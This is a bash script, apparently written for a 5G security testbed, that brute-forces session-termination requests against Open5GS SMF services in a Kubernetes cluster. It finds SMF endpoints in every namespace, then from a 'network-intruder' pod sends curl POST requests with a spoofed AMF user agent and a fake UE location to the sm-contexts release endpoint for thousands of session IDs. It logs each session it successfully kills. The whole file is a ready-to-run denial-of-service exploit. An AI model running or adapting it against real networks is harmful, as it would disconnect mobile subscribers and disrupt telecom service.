#!/usr/bin/env bash
#
# bruteForceAttack.sh
#
# Brute-force attack script for SMF session termination.
# Runs from a Kubernetes node, discovers SMF SBI services via kubectl,
# and executes the attack commands inside a network-intruder pod
# (where cluster DNS and networking are available).
#

set -euo pipefail

# ============================================================================
# CONFIGURATION
# ============================================================================

# Number of session IDs to brute-force
END=${END:-2000}

# 5G Location Information Parameters (used in attack payload)
MCC=${MCC:-"208"}              # Mobile Country Code
MNC=${MNC:-"93"}               # Mobile Network Code
TAC=${TAC:-"000001"}           # Tracking Area Code
NR_CELL_ID=${NR_CELL_ID:-"000000010"}  # NR Cell ID

# Pod used to execute the attack (auto-discovered if not provided)
EXEC_NAMESPACE=""
EXEC_POD=""

# ============================================================================
# USAGE AND HELP
# ============================================================================

function show_usage() {
  cat <<USAGE
Usage: $0 [OPTIONS] [TARGETS]

Brute-force SMF session IDs to trigger session termination.
Runs from a Kubernetes node and executes attacks inside a network-intruder pod.

OPTIONS:
  --auto                Auto-discover all SMF SBI services in the cluster
                        (DEFAULT - used if no TARGETS are provided)
  --help, -h            Show this help message
  --count N             Number of session IDs to brute-force (default: 2000)
  --exec-pod NAME       Pod to execute attacks from (default: auto-discover network-intruder)
  --exec-namespace NS   Namespace of the exec pod (default: auto-discover)

5G LOCATION PARAMETERS (optional):
  --mcc MCC             Mobile Country Code (default: 208)
  --mnc MNC             Mobile Network Code (default: 93)
  --tac TAC             Tracking Area Code (default: 000001)
  --nrCellId ID         NR Cell ID (default: 000000010)

TARGETS (when --auto is not used):
  SMF service FQDNs or IPs (must be reachable from inside the exec pod)
  Examples:
    $0 open5gs-smf.noztx5gc.svc.cluster.local
    $0 open5gs-smf.ns1.svc.cluster.local open5gs-smf.ns2.svc.cluster.local

EXAMPLES:
  # Auto-discover SMF services and network-intruder pod
  $0
  $0 --auto

  # Explicit targets
  $0 open5gs-smf.noztx5gc.svc.cluster.local
  $0 open5gs-smf.ns1.svc.cluster.local open5gs-smf.ns2.svc.cluster.local

  # Custom session count and 5G parameters
  $0 --count 5000 --mcc 310 --mnc 410

  # Specify which pod to execute from
  $0 --exec-namespace ztx5gc --exec-pod network-intruder-abc123

USAGE
}

# ============================================================================
# DISCOVERY FUNCTIONS
# ============================================================================

# Find a running network-intruder pod in the cluster
# Sets EXEC_NAMESPACE and EXEC_POD globals
function find_intruder_pod() {
  local pod_info
  pod_info=$(kubectl get pods --all-namespaces --no-headers 2>/dev/null \
    | grep -i "network-intruder" \
    | grep -i "running" \
    | head -1) || true

  if [ -z "$pod_info" ]; then
    echo "ERROR: No running network-intruder pod found in the cluster." >&2
    echo "       Use --exec-namespace and --exec-pod to specify manually." >&2
    exit 1
  fi

  EXEC_NAMESPACE=$(echo "$pod_info" | awk '{print $1}')
  EXEC_POD=$(echo "$pod_info" | awk '{print $2}')
}

# Get all namespace names in the cluster
function list_namespaces() {
  kubectl get namespaces -o jsonpath='{.items[*].metadata.name}' | tr ' ' '\n'
}

# Get SMF SBI service names in a specific namespace
# Matches "smf" in name/labels, excludes non-SBI services (pfcp, metrics, etc.)
function list_smf_services_in_namespace() {
  local ns="$1"
  kubectl get services -n "$ns" -o json 2>/dev/null | python3 -c \
    'import json,sys,re
data=json.load(sys.stdin)
for item in data["items"]:
    name = item["metadata"]["name"]
    labels = item["metadata"].get("labels", {})
    has_smf = re.search(r"smf", name, re.I) or any(re.search(r"smf", str(v), re.I) for v in labels.values())
    is_excluded = re.search(r"pfcp|metrics|prometheus|monitor", name, re.I)
    if has_smf and not is_excluded:
        print(name)' || true
}

# Discover all SMF SBI services across all namespaces
# Returns FQDNs: <service>.<namespace>.svc.cluster.local
function discover_smf_services() {
  local found=()

  for ns in $(list_namespaces); do
    for svc in $(list_smf_services_in_namespace "$ns"); do
      found+=("${svc}.${ns}.svc.cluster.local")
    done
  done

  if [ ${#found[@]} -eq 0 ]; then
    echo "ERROR: No SMF SBI services found in any namespace." >&2
    return 1
  fi

  printf '%s\n' "${found[@]}"
}

# ============================================================================
# ATTACK FUNCTION
# ============================================================================

# Execute brute-force attack against a single SMF service inside the exec pod.
#
# How it works:
#   1. This function builds a bash script with the brute-force loop.
#   2. The script is sent to the network-intruder pod via "kubectl exec".
#   3. Inside the pod, CoreDNS resolves the SMF FQDN and curl sends requests.
#
# Arguments:
#   $1 - SMF service FQDN (resolvable from inside the pod via CoreDNS)
function run_attack_in_pod() {
  local smf_host="$1"

  echo "  -> $smf_host (via $EXEC_NAMESPACE/$EXEC_POD)"

  # The heredoc below is a bash script that runs INSIDE the pod.
  # Variables like ${smf_host}, ${END}, ${MCC} are expanded HERE (on the node)
  # and baked into the command before sending to the pod.
  # Variables like \$i and \$op are escaped so they run INSIDE the pod.
  kubectl exec -i -n "$EXEC_NAMESPACE" "$EXEC_POD" -- bash <<ATTACK_CMD
for i in \$(seq 1 ${END}); do
  op=\$(curl -s -o /dev/null -w "%{http_code}" \\
    --request POST \\
    -d '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"${MCC}","mnc":"${MNC}"},"tac":"${TAC}"},"ncgi":{"plmnId":{"mcc":"${MCC}","mnc":"${MNC}"},"nrCellId":"${NR_CELL_ID}"},"ueLocationTimestamp":"2026-05-29T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}' \\
    -H "Content-Type: application/json" \\
    --http2-prior-knowledge \\
    -A "AMF" \\
    "http://${smf_host}/nsmf-pdusession/v1/sm-contexts/\${i}/release")
  if [ "\$op" = "204" ]; then
    echo
    echo "Time = \$(date)"
    echo "Attack successful for session with user context \$i"
    echo "Interface-Type = Service-based"
    echo "Interface = AMF-SMF"
    echo "NF Hostname = ${smf_host}"
  fi
done
ATTACK_CMD
}

# ============================================================================
# MAIN LOGIC
# ============================================================================

function main() {
  local use_auto=false
  local targets=()

  # Parse command-line arguments
  while [ $# -gt 0 ]; do
    case "$1" in
      --auto)
        use_auto=true
        shift ;;
      --help|-h)
        show_usage
        exit 0 ;;
      --count)
        if [ $# -lt 2 ]; then echo "ERROR: --count requires a value" >&2; exit 1; fi
        END="$2"; shift 2 ;;
      --mcc)
        if [ $# -lt 2 ]; then echo "ERROR: --mcc requires a value" >&2; exit 1; fi
        MCC="$2"; shift 2 ;;
      --mnc)
        if [ $# -lt 2 ]; then echo "ERROR: --mnc requires a value" >&2; exit 1; fi
        MNC="$2"; shift 2 ;;
      --tac)
        if [ $# -lt 2 ]; then echo "ERROR: --tac requires a value" >&2; exit 1; fi
        TAC="$2"; shift 2 ;;
      --nrCellId)
        if [ $# -lt 2 ]; then echo "ERROR: --nrCellId requires a value" >&2; exit 1; fi
        NR_CELL_ID="$2"; shift 2 ;;
      --exec-pod)
        if [ $# -lt 2 ]; then echo "ERROR: --exec-pod requires a value" >&2; exit 1; fi
        EXEC_POD="$2"; shift 2 ;;
      --exec-namespace)
        if [ $# -lt 2 ]; then echo "ERROR: --exec-namespace requires a value" >&2; exit 1; fi
        EXEC_NAMESPACE="$2"; shift 2 ;;
      -*)
        echo "ERROR: Unknown option: $1" >&2
        show_usage
        exit 1 ;;
      *)
        targets+=("$1")
        shift ;;
    esac
  done

  # Default to auto-discovery if no targets provided
  if [ ${#targets[@]} -eq 0 ]; then
    use_auto=true
  fi

  # Step 1: Discover SMF services if using auto mode
  if [ "$use_auto" = true ]; then
    echo "Auto-discovering SMF SBI services..."
    while IFS= read -r svc; do
      [ -n "$svc" ] && targets+=("$svc")
    done < <(discover_smf_services)
  fi

  if [ ${#targets[@]} -eq 0 ]; then
    echo "ERROR: No SMF services to attack." >&2
    exit 1
  fi

  # Step 2: Find the exec pod (network-intruder) if not specified
  if [ -z "$EXEC_POD" ] || [ -z "$EXEC_NAMESPACE" ]; then
    echo "Finding network-intruder pod..."
    find_intruder_pod
  fi

  # Step 3: Show attack summary
  echo
  echo "Exec pod:       $EXEC_NAMESPACE/$EXEC_POD"
  echo "Targets:        ${targets[*]}"
  echo "Session range:  1 to $END"
  echo "5G Location:    MCC=$MCC, MNC=$MNC, TAC=$TAC, NR_CELL_ID=$NR_CELL_ID"
  echo "---"

  # Step 4: Launch attacks in parallel (one kubectl exec per target)
  for svc in "${targets[@]}"; do
    run_attack_in_pod "$svc" &
  done

  # Wait for all parallel attacks to finish
  wait

  echo "---"
  echo "Attack completed."
}

# Entry point
main "$@"
